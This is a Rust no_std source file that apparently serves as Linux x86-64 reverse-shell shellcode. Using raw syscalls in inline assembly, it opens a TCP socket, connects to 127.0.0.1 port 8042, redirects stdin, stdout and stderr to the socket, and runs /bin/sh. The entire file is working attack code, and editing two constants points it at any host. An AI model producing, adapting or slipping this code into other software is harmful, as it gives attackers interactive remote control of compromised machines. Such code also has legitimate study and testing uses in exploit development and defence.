#![no_std]
#![no_main]

use core::arch::asm;

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}


const PORT: u16 = 0x6a1f; //8042
const IP: u32 = 0x100007f;//127.0.0.1

//syscalls
const SYS_DUP2: usize = 33;
const SYS_SOCKET: usize = 41;
const SYS_CONNECT: usize = 42;
const SYS_EXECVE: usize = 59;

const AF_INET: usize = 2;
const SOCK_STREAM: usize = 1;
const IPPROTO_IP: usize = 0;

const STDIN: usize = 0;
const STDOUT: usize = 1;
const STDERR: usize = 2;

//copied fron netinet/in.h
#[repr(C)]
struct in_addr {
    s_addr: u32
}

#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8]
}


unsafe fn syscall_2(syscall: usize, arg1: usize, arg2: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

unsafe fn syscall_3(syscall: usize, arg1: usize, arg2: usize, arg3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        in("rax") syscall,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack),
    );
    ret
}

#[no_mangle]
fn _start() -> ! {
    let sh: &str = "/bin/sh\x00";
    let argv: [*const &str; 2] = [&sh, core::ptr::null()];
    let sock_addr = sockaddr_in {
        sin_family: AF_INET as u16,
        sin_port: PORT,
        sin_addr: in_addr {s_addr: IP},
        sin_zero: [0; 8]
    };
    let sock_addr_len = core::mem::size_of::<sockaddr_in>();

    unsafe {
        let sock_fd = syscall_3(SYS_SOCKET, AF_INET, SOCK_STREAM, IPPROTO_IP);
        syscall_3(SYS_CONNECT, sock_fd, &sock_addr as *const sockaddr_in as usize, sock_addr_len as usize);

        syscall_2(SYS_DUP2, sock_fd, STDIN);
        syscall_2(SYS_DUP2, sock_fd, STDOUT);
        syscall_2(SYS_DUP2, sock_fd, STDERR);

        syscall_3(SYS_EXECVE, sh.as_ptr() as usize, argv.as_ptr() as usize, 0);
    };

    loop {}
}
